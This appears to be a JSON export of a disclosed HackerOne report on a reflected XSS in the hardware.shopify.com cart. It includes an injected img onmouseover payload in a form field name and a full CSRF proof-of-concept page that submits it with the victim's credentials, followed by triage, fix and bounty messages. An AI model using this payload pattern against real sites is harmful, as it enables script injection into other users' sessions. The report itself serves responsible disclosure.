{"id":95089,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTA4OQ==","url":"https://hackerone.com/reports/95089","title":"Reflected XSS in cart at hardware.shopify.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-10-21T23:11:40.534Z","submitted_at":"2015-10-21T23:11:40.534Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"juhhga","url":"/juhhga","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-12-22T19:57:07.548Z","bug_reporter_agreed_on_going_public_at":"2015-12-22T19:57:05.227Z","team_member_agreed_on_going_public_at":"2015-12-21T23:28:33.828Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There is a reflected XSS at hardware.shopify.com in cart section. As there is no CSRF protetion for adding products to a cart, this one is a legitimate cross-user reflected XSS/HTML injection\n\nReproduction:\n1. Got to http://hardware.shopify.com/collections/gift-cards/products/custom-gift-card\n2. Select an image, click \"add to Cart\"\n3. Intercept the request and change the 'artwork file' parameter as follows:\nbefore: Content-Disposition: form-data; name=\"properties[Artwork file]\"\nafter: Content-Disposition: form-data; name=\"properties[Artwork file\u003cimg src='test' onmouseover='alert(2)'\u003e]\";\n4. Forward the request, return to the cart, mouseover the image and see a popup.\n\nAltyernatively, use the following CSRF PoC:\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cscript\u003e\n      function submitRequest()\n      {\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", \"http://hardware.shopify.com/cart/add\", true);\n        xhr.setRequestHeader(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");\n        xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\");\n        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=---------------------------13411895127118\");\n        xhr.withCredentials = true;\n        var body = \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Artwork file\\x3cimg src=\\'test\\' onmouseover=\\'alert(2)\\'\\x3e]\\\"; filename=\\\"test.png\\\"\\r\\n\" + \n          \"Content-Type: image/png\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\x89PNG\\r\\n\" + \n          \"\\x1a\\n\" + \n          \"\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\xc7\\x00\\x00\\x00\\xcc\\x08\\x02\\x00\\x00\\x00H\\xa0 R\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x04gAMA\\x00\\x00\\xb1\\x8f\\x0b\\xfca\\x05\\x00\\x00\\x00\\tpHYs\\x00\\x00\\x12t\\x00\\x00\\x12t\\x01\\xdef\\x1fx\\x00\\x00\\x01\\xfcIDATx^\\xed\\xd21\\x01\\x00\\x00\\x0c\\xc3\\xa0\\xf97\\xdd\\x99\\xc8\\t\\x1a\\xb8A\\xcd*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\x9eU\\xf4\\xac\\xa2g\\x15=\\xab\\xe8YE\\xcf*zV\\xd1\\xb3\\x8a\\xda\\xf6\\xe3\\xef\\xfb\\xfc\\x89u\\x11o\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 1]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 2]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"properties[Custom text line 3]\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"production-time\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"standard\\r\\n\" + \n          \"-----------------------------13411895127118\\r\\n\" + \n          \"Content-Disposition: form-data; name=\\\"id\\\"\\r\\n\" + \n          \"\\r\\n\" + \n          \"976094353\\r\\n\" + \n          \"-----------------------------13411895127118--\\r\\n\";\n        var aBody = new Uint8Array(body.length);\n        for (var i = 0; i \u003c aBody.length; i++)\n          aBody[i] = body.charCodeAt(i); \n        xhr.send(new Blob([aBody]));\n      }\n    \u003c/script\u003e\n    \u003cform action=\"#\"\u003e\n      \u003cinput type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":58279,"file_name":"xss_hardware.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/058/279/d15ca405bbc527726f318a812474ee0a23417a91/xss_hardware.png?response-content-disposition=attachment%3B%20filename%3D%22xss_hardware.png%22%3B%20filename%2A%3DUTF-8%27%27xss_hardware.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154437Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4945a49f9ea5c58778a909f7fb4eb9dfa5f521dfcbb5fcd0bc15b2784e861fe1","file_size":65909,"type":"image/png"}],"allow_singular_disclosure_at":"2016-01-20T23:28:33.995Z","allow_singular_disclosure_after":-180634563.3135117,"singular_disclosure_allowed":true,"vote_count":8,"voters":["drsniper","ankitsingh","safisec","kinkoknik","booghi","0x7d7b","mkerval","shine_"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":628048,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Addition: this request would also work for the following domain: shopifyhardware.myshopify.com, which alludes that authenticated admins of this shop could be targeted as well!","automated_response":false,"created_at":"2015-10-22T00:31:53.763Z","updated_at":"2015-10-22T00:31:53.763Z","actor":{"username":"juhhga","cleared":false,"url":"/juhhga","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":628523,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report.\n\nWe have corrected the problem on hardware.shopify.com but we still need to investigate this further, as the problem appears to have originated in a third-party app and may affect other shops. We'll send you an update as soon as we know more.","automated_response":false,"created_at":"2015-10-22T14:33:54.118Z","updated_at":"2015-10-22T14:33:54.118Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":724299,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your patience. We have now corrected the cross-site scripting problem in our core application so that all Shopify stores are protected.\n\nOur next round of bounty decisions will take place before the end of the year, so we will be in touch with you again soon.\n\nThank you for your interest in improving the security of Shopify!","automated_response":false,"created_at":"2015-12-17T15:03:00.103Z","updated_at":"2015-12-17T15:03:00.103Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"juhhga","url":"/juhhga"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":728891,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify! This issue has been resolved.","automated_response":false,"created_at":"2015-12-21T23:28:27.736Z","updated_at":"2015-12-21T23:28:27.736Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"juhhga","url":"/juhhga"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":728892,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-12-21T23:28:33.858Z","updated_at":"2015-12-21T23:28:33.858Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":729900,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks!","automated_response":false,"created_at":"2015-12-22T19:57:05.269Z","updated_at":"2015-12-22T19:57:16.987Z","actor":{"username":"juhhga","cleared":false,"url":"/juhhga","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":729901,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-12-22T19:57:07.575Z","updated_at":"2015-12-22T19:57:07.575Z","actor":{"username":"juhhga","cleared":false,"url":"/juhhga","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}